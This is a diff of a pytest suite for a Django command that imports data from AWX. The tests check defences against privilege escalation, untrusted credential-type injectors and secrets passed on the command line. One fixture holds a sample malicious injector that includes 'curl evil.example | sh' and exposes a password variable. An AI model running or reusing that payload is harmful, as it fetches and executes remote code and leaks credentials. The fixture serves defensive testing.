@@ -240,8 +240,15 @@ def test_import_rbac_role_assignments(fake_awx):
     assert alice in org.admin_role.members.all()
     # Team grant: the JT execute_role inherits from the team's member_role.
     assert team.member_role in jt.execute_role.parents.all()
-    # Singleton: bob became a system auditor.
+    # Singleton system roles are NOT honoured without --grant-superusers (M1).
     bob.refresh_from_db()
+    assert not bob.is_system_auditor
+
+
+@pytest.mark.django_db
+def test_import_rbac_system_roles_with_opt_in(fake_awx):
+    call_command('import_from_awx', url='https://awx.example.com', token='t', grant_superusers=True)
+    bob = User.objects.get(username='bob')
     assert bob.is_system_auditor
 
 
@@ -272,3 +279,261 @@ def test_import_is_idempotent(fake_awx):
     assert JobTemplate.objects.filter(name='jt').count() == 1
     assert WorkflowJobTemplateNode.objects.filter(identifier='node-a').count() == 1
     assert Schedule.objects.filter(name='nightly').count() == 1
+
+
+# --- M1: the source cannot make anyone a superuser unless the operator opts in ---
+
+
+@pytest.fixture
+def system_admin_role(monkeypatch):
+    """Add a system_administrator singleton role held by alice on the source."""
+    monkeypatch.setitem(AWX_DATA, 'roles', AWX_DATA['roles'] + [{'id': 203, 'role_field': 'system_administrator', 'summary_fields': {}}])
+    monkeypatch.setitem(SUB_DATA, ('roles', 203, 'users'), [{'id': 10}])
+
+
+@pytest.mark.django_db
+def test_source_superuser_flag_is_ignored_by_default(fake_awx, system_admin_role):
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    # 'root' is is_superuser on the source; alice holds system_administrator.
+    assert not User.objects.get(username='root').is_superuser
+    assert not User.objects.get(username='alice').is_superuser
+
+
+@pytest.mark.django_db
+def test_superuser_grants_need_the_opt_in_and_are_audited(fake_awx, system_admin_role):
+    from forail.main.models.audit import AuditEvent
+
+    call_command('import_from_awx', url='https://awx.example.com', token='t', grant_superusers=True)
+    assert User.objects.get(username='root').is_superuser
+    assert User.objects.get(username='alice').is_superuser
+    # The bulk import disables the activity stream; the dedicated audit log
+    # must still record every promotion.
+    granted = set(AuditEvent.objects.filter(action='superuser_granted').values_list('resource_name', flat=True))
+    assert {'root', 'alice'} <= granted
+
+
+@pytest.mark.django_db
+def test_import_never_demotes_a_local_superuser(fake_awx):
+    # Forail's bootstrap admin shares a username with a non-superuser on the source.
+    User.objects.create_superuser('alice', 'admin@forail.local', 'pw')
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    assert User.objects.get(username='alice').is_superuser
+
+
+
+# --- M2: custom credential-type injectors from the source are untrusted ---
+
+EVIL_INJECTORS = {'env': {'PAYLOAD': '{{ password }}'}, 'file': {'template': '#!/bin/sh\ncurl evil.example | sh'}}
+
+
+@pytest.fixture
+def source_injectors(monkeypatch):
+    ct = dict(AWX_DATA['credential_types'][0], injectors=EVIL_INJECTORS)
+    monkeypatch.setitem(AWX_DATA, 'credential_types', [ct])
+
+
+@pytest.mark.django_db
+def test_injectors_are_dropped_by_default(fake_awx, source_injectors):
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    ct = CredentialType.objects.get(name='My Cloud')
+    assert ct.injectors == {}
+    # The credential itself still comes over and points at the type.
+    assert Credential.objects.get(name='cloud-cred').credential_type == ct
+
+
+@pytest.mark.django_db
+def test_injectors_are_imported_with_the_opt_in(fake_awx, source_injectors):
+    call_command('import_from_awx', url='https://awx.example.com', token='t', trust_injectors=True)
+    assert CredentialType.objects.get(name='My Cloud').injectors == EVIL_INJECTORS
+
+
+@pytest.mark.django_db
+def test_rerun_keeps_injectors_an_admin_re_approved(fake_awx, source_injectors):
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    approved = {'env': {'MY_CLOUD_USER': '{{ username }}'}}
+    ct = CredentialType.objects.get(name='My Cloud')
+    ct.injectors = approved
+    ct.save()
+
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    assert CredentialType.objects.get(name='My Cloud').injectors == approved
+
+
+@pytest.mark.django_db
+def test_managed_types_are_matched_not_overwritten(fake_awx, monkeypatch):
+    from forail.main.models.credential import ManagedCredentialType  # noqa: F401  (registers managed types)
+
+    CredentialType.setup_tower_managed_defaults()
+    machine = CredentialType.objects.get(managed=True, namespace='ssh')
+    before = machine.injectors
+    monkeypatch.setitem(
+        AWX_DATA, 'credential_types',
+        AWX_DATA['credential_types'] + [{'id': 31, 'name': machine.name, 'kind': 'ssh', 'managed': True, 'inputs': {}, 'injectors': EVIL_INJECTORS}],
+    )
+    call_command('import_from_awx', url='https://awx.example.com', token='t', trust_injectors=True)
+    machine.refresh_from_db()
+    assert machine.injectors == before
+
+
+# --- M3: secrets reach the client without going through argv ---
+
+
+@pytest.fixture
+def client_args(mocker):
+    seen = {}
+
+    class Recording(FakeAWXClient):
+        def __init__(self, base_url, token=None, username=None, password=None, **kwargs):
+            seen.update(token=token, username=username, password=password)
+            super().__init__()
+
+    mocker.patch('forail.main.management.commands.import_from_awx.AWXClient', Recording)
+    return seen
+
+
+def _run(**kw):
+    from io import StringIO
+
+    err = StringIO()
+    call_command('import_from_awx', url='https://awx.example.com', resource=['organizations'], stderr=err, stdout=StringIO(), **kw)
+    return err.getvalue()
+
+
+@pytest.mark.django_db
+def test_token_from_a_file(client_args, tmp_path, monkeypatch):
+    monkeypatch.delenv('AWX_TOKEN', raising=False)
+    f = tmp_path / 'token'
+    f.write_text('s3cret-token\n')  # trailing newline from an editor is trimmed
+    err = _run(token_file=str(f))
+    assert client_args['token'] == 's3cret-token'
+    assert 'DEPRECATED' not in err
+
+
+@pytest.mark.django_db
+def test_token_from_the_environment(client_args, monkeypatch):
+    monkeypatch.setenv('AWX_TOKEN', 'env-token')
+    _run()
+    assert client_args['token'] == 'env-token'
+
+
+@pytest.mark.django_db
+def test_file_wins_over_environment(client_args, tmp_path, monkeypatch):
+    monkeypatch.setenv('AWX_TOKEN', 'env-token')
+    f = tmp_path / 'token'
+    f.write_text('file-token')
+    _run(token_file=str(f))
+    assert client_args['token'] == 'file-token'
+
+
+@pytest.mark.django_db
+def test_password_from_file_or_environment(client_args, tmp_path, monkeypatch):
+    monkeypatch.delenv('AWX_TOKEN', raising=False)
+    monkeypatch.setenv('AWX_USERNAME', 'admin')
+    monkeypatch.setenv('AWX_PASSWORD', 'env-pw')
+    _run()
+    assert (client_args['username'], client_args['password']) == ('admin', 'env-pw')
+
+    f = tmp_path / 'pw'
+    f.write_text('file-pw\n')
+    _run(password_file=str(f))
+    assert client_args['password'] == 'file-pw'
+
+
+@pytest.mark.django_db
+def test_secret_on_the_command_line_still_works_but_warns(client_args, monkeypatch):
+    monkeypatch.delenv('AWX_TOKEN', raising=False)
+    err = _run(token='argv-token')
+    assert client_args['token'] == 'argv-token'
+    assert 'DEPRECATED' in err
+
+
+@pytest.mark.django_db
+def test_no_password_and_no_terminal_fails_instead_of_hanging(client_args, monkeypatch):
+    from django.core.management.base import CommandError
+
+    for var in ('AWX_TOKEN', 'AWX_PASSWORD'):
+        monkeypatch.delenv(var, raising=False)
+    monkeypatch.setattr('sys.stdin', None)
+    with pytest.raises(CommandError, match='No password supplied'):
+        _run(username='admin')
+
+
+@pytest.mark.django_db
+def test_unreadable_secret_file_is_a_clear_error(client_args, tmp_path, monkeypatch):
+    from django.core.management.base import CommandError
+
+    monkeypatch.delenv('AWX_TOKEN', raising=False)
+    with pytest.raises(CommandError, match='Could not read the token'):
+        _run(token_file=str(tmp_path / 'missing'))
+
+
+@pytest.mark.django_db
+def test_skipped_grants_are_reported(fake_awx, system_admin_role, capsys):
+    from io import StringIO
+
+    out = StringIO()
+    call_command('import_from_awx', url='https://awx.example.com', token='t', stdout=out)
+    report = out.getvalue()
+    assert 'root' in report and 'alice' in report
+    assert '--grant-superusers' in report
+
+
+@pytest.mark.django_db
+def test_report_groups_what_the_operator_must_act_on(fake_awx, source_injectors):
+    from io import StringIO
+
+    out = StringIO()
+    call_command('import_from_awx', url='https://awx.example.com', token='t', stdout=out)
+    report = out.getvalue()
+    assert 'see log' not in report
+    skipped = report.index('Privilege grants SKIPPED')
+    injectors = report.index('Credential-type injectors NOT applied')
+    secrets = report.index('Secrets and passwords to re-enter')
+    assert skipped < injectors < secrets
+    assert 'Credential "cloud-cred": 1 secret field(s)' in report
+    assert 'Privileges GRANTED' not in report
+
+
+@pytest.mark.django_db
+def test_dry_run_report_file_lists_every_object_by_name(fake_awx, source_injectors, tmp_path):
+    import json
+
+    path = tmp_path / 'report.json'
+    call_command('import_from_awx', url='https://awx.example.com', token='t', dry_run=True, report_file=str(path))
+    report = json.loads(path.read_text())
+
+    assert report['format'] == 'forail-import-report/1'
+    assert report['dry_run'] is True
+    assert report['source'] == 'https://awx.example.com'
+    assert report['options'] == {'grant_superusers': False, 'trust_injectors': False}
+    objs = report['objects']
+    assert sorted(objs['user']['created']) == ['alice', 'bob', 'root']
+    assert objs['job_template']['created'] == ['Acme / jt']
+    assert objs['workflow_node']['created'] == ['wf / node-a', 'wf / node-b']
+    assert objs['schedule']['created'] == ['jt / nightly']
+    assert report['secret_fields_pending'] == 2
+    assert any('My Cloud' in w for w in report['warnings']['injectors'])
+    # Still a dry run: nothing was written to the database.
+    assert not Organization.objects.filter(name='Acme').exists()
+
+
+@pytest.mark.django_db
+def test_rerun_report_shows_updates_not_creates(fake_awx, tmp_path):
+    import json
+
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    path = tmp_path / 'report.json'
+    call_command('import_from_awx', url='https://awx.example.com', token='t', dry_run=True, report_file=str(path))
+    objs = json.loads(path.read_text())['objects']
+    assert objs['organization'] == {'created': [], 'updated': ['Acme']}
+    assert objs['credential']['updated'] == ['Acme / cloud-cred']
+
+
+@pytest.mark.django_db
+def test_unwritable_report_file_does_not_fail_the_import(fake_awx, tmp_path):
+    from io import StringIO
+
+    err = StringIO()
+    call_command('import_from_awx', url='https://awx.example.com', token='t', report_file=str(tmp_path / 'no' / 'such' / 'dir.json'), stderr=err, stdout=StringIO())
+    assert 'Could not write the report' in err.getvalue()
+    assert Organization.objects.filter(name='Acme').exists()
